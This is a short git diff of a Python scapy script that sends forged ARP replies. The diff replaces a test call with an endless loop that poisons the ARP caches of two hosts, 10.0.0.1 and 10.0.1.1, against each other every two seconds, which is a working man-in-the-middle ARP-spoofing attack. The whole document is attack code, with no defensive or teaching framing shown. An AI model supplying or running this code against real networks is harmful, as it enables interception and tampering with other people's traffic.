@@ -15,4 +15,7 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
     scapy.send(packet)
 
-get_mac("10.0.1.1")
+while True:
+    spoof("10.0.0.1", "10.0.1.1")
+    spoof("10.0.1.1", "10.0.0.1")
+    time.sleep(2)
